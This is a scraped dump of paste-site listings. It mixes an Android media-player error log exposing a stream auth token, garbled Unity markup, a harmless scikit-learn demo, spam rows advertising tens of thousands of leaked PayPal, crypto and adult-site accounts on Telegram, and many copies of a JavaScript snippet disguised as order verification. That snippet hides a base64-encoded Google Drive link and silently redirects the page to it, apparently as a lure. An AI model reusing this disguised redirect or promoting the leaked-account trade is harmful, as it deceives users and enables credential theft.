	at androidx.media3.datasource.DefaultHttpDataSource.skipFully(DefaultHttpDataSource.java:744)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:455)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2008. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":0},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2008,""extras"":{""mMap"":{}},""timestampMs"":1228406499,""cause"":{""dataSpec"":{""absoluteStreamPosition"":8387932,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://colonelinux.org/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d11de26eae4d21082966d7bdf7e7b8529\u0026type\u003dsong\u0026id\u003d19575"",""length"":6704255,""position"":8387932,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":744,""methodName"":""skipFully""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":455,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":0},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2008,""extras"":{""mMap"":{}},""timestampMs"":1228406499,""cause"":{""dataSpec"":{""absoluteStreamPosition"":8387932,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://colonelinux.org/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d11de26eae4d21082966d7bdf7e7b8529\u0026type\u003dsong\u0026id\u003d19575"",""length"":6704255,""position"":8387932,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":744,""methodName"":""skipFully""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":455,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
4Njrm4br,x,KutermaScripts,HTML,Monday 28th of April 2025 10:28:55 AM CDT,"<align=""center""><color=#D70040><b><size=25>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ Ewalfor Project!</size></b></color></align>
<align=""center""><color=#cb5cfa>__________________________________________________</color></align>

<align=center><size=20><link=""https://discord.gg/aWAdqhCwAS""><mark=#4477B9>|üì±|</mark><mark=#3A3A3A>   –î–∏—Å–∫–æ—Ä–¥ <space=0.05em>‚Äé  </mark></link><space=0.5em>‚Äé"
gizGTfER,PayPal with Balance,navrajkhunger,JavaScript,Monday 28th of April 2025 10:22:18 AM CDT,49049 Accounts Posted On https://t.me/leakedbyem1nem
nJ0FFEVr,Products.js,WassupDog45,JavaScript,Monday 28th of April 2025 10:20:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41321/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gw7Waf70,KeySystem,PRSADSRXSIRAX,Lua,Monday 28th of April 2025 10:18:37 AM CDT,SierraStudios
5u9FyvKe,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 28th of April 2025 10:06:57 AM CDT,59894 Accounts Posted On https://t.me/leakedbyem1nem
LXiQ47sR,Order.js,WassupDog45,JavaScript,Monday 28th of April 2025 10:05:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06012/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FckJ3Gb3,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 28th of April 2025 09:51:35 AM CDT,17432 Accounts Posted On https://t.me/leakedbyem1nem
yERMkTd8,Market.js,WassupDog45,JavaScript,Monday 28th of April 2025 09:49:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76308/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B8VN5aZs,Crypto Accounts,navrajkhunger,JavaScript,Monday 28th of April 2025 09:36:12 AM CDT,96020 Accounts Posted On https://t.me/leakedbyem1nem
dRa2nVAH,Untitled,WassupDog45,JavaScript,Monday 28th of April 2025 09:34:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30614/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q8FC2a8Q,PayPal with Balance,navrajkhunger,JavaScript,Monday 28th of April 2025 09:20:50 AM CDT,25717 Accounts Posted On https://t.me/leakedbyem1nem
5hk4HYeu,Market.js,navrajkhunger,JavaScript,Monday 28th of April 2025 09:19:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66488/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vF1GgYR3,Crypto Accounts,luqlegal,JavaScript,Monday 28th of April 2025 09:05:23 AM CDT,39744 Accounts Posted On https://t.me/leakedbyem1nem
L3D8sLyV,Untitled,navrajkhunger,JavaScript,Monday 28th of April 2025 09:03:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Hd1LENdF,Jumbo,brandblox,Python,Monday 28th of April 2025 09:03:09 AM CDT,"import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from sklearn.tree import DecisionTreeClassifier
from sklearn.linear_model import LinearRegression, LogisticRegression
from sklearn.naive_bayes import GaussianNB
from sklearn.neighbors import KNeighborsClassifier
from sklearn.svm import SVC
from sklearn.ensemble import RandomForestClassifier
from sklearn.cluster import KMeans
from sklearn.metrics import precision_recall_fscore_support, confusion_matrix, accuracy_score, roc_curve, auc, classification_report
from sklearn.datasets import load_diabetes

def load_data():
    # Load and preprocess the diabetes dataset
    data = load_diabetes()
    df = pd.DataFrame(data.data, columns=data.feature_names)
    df = df.drop(columns=[""s1""])  # Dropping one unnecessary column
    df['target'] = (data.target > data.target.mean()).astype(int)  # Convert target to binary
    print(""First 5 rows of the dataset:"")
    print(df.head())
    return df

def split_data(df, target_column):
    # Split the dataset into features and target
    X = df.drop(columns=[target_column])
    y = df[target_column]
    return train_test_split(X, y, test_size=0.2, random_state=42)

def scale_features(X_train, X_test):
    # Standardize the features
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)
    X_test_scaled = scaler.transform(X_test)
    return X_train_scaled, X_test_scaled

def select_model(model_type):
    # Select and return the model based on the type
    if model_type == ""linear_regression"":
        return LinearRegression()
    elif model_type == ""logistic_regression"":
        return LogisticRegression()
    elif model_type == ""decision_tree"":
        return DecisionTreeClassifier()
    elif model_type == ""random_forest"":
        return RandomForestClassifier()
    elif model_type == ""knn"":
        return KNeighborsClassifier()
    elif model_type == ""naive_bayes"":
        return GaussianNB()
    elif model_type == ""svm"":
        return SVC(probability=True)
    elif model_type == ""k_means"":
        return KMeans(n_clusters=2)  # For binary clustering, modify as needed

def train_model(model, X_train, y_train):
    # Train the selected model
    model.fit(X_train, y_train)

def make_predictions(model, X_test):
    # Make predictions using the trained model
    return model.predict(X_test)

def evaluate_model(model, X_test, y_test, y_pred):
    # Evaluate the model using accuracy, precision, recall, and F1 score
    if hasattr(model, ""predict_proba""):  # If model supports probability prediction
        y_probs = model.predict_proba(X_test)[:, 1]  # Get probabilities for ROC Curve
        fpr, tpr, _ = roc_curve(y_test, y_probs)
        roc_auc = auc(fpr, tpr)
        plt.plot(fpr, tpr, label=f'ROC Curve (AUC = {roc_auc:.2f})')
        plt.plot([0, 1], [0, 1], linestyle='--')
        plt.xlabel(""False Positive Rate"")
        plt.ylabel(""True Positive Rate"")
        plt.title(""ROC Curve"")
        plt.legend()
        plt.show()
    
    accuracy = accuracy_score(y_test, y_pred)
    precision, recall, f1, _ = precision_recall_fscore_support(y_test, y_pred, average='binary')
    print(f""Accuracy: {accuracy:.2f}, Precision: {precision:.2f}, Recall: {recall:.2f}, F1 Score: {f1:.2f}"")
    print(""\nClassification Report:\n"", classification_report(y_test, y_pred))

def plot_confusion_matrix(y_test, y_pred):
    cm = confusion_matrix(y_test, y_pred)
    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues')
    plt.xlabel(""Predicted"")
    plt.ylabel(""Actual"")
    plt.title(""Confusion Matrix"")
    plt.show()

def display_predictions(X_test, y_pred):
    print(""Sample Predictions:"")
    sample_df = pd.DataFrame(X_test[:5], columns=[f'Feature_{i}' for i in range(X_test.shape[1])])
    sample_df['Predicted Target'] = y_pred[:5]
    print(sample_df)

# Example usage
if __name__ == ""__main__"":
    target_column = ""target""  # Column to predict

    # Load and prepare the data
    df = load_data()
    X_train, X_test, y_train, y_test = split_data(df, target_column)
    X_train, X_test = scale_features(X_train, X_test)
    
    # Select the model type here (replace with your choice)
    model_type = ""decision_tree""  # Can be any model type from the available options
    
    # Choose model
    model = select_model(model_type)
    
    # Train model
    train_model(model, X_train, y_train)
    
    # Make predictions
    y_pred = make_predictions(model, X_test)
    
    # Display sample predictions
    display_predictions(X_test, y_pred)
    
    # Evaluate the model
    evaluate_model(model, X_test, y_test, y_pred)
    
    # Plot confusion matrix
    plot_confusion_matrix(y_test, y_pred)
"
tbKU2dWY,PayPal with Balance,luqlegal,JavaScript,Monday 28th of April 2025 08:50:01 AM CDT,32903 Accounts Posted On https://t.me/leakedbyem1nem
shpgXp0c,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 08:48:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22733/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kCckvz6P,Crypto Accounts,iLoveToWatch,JavaScript,Monday 28th of April 2025 08:34:34 AM CDT,72272 Accounts Posted On https://t.me/leakedbyem1nem
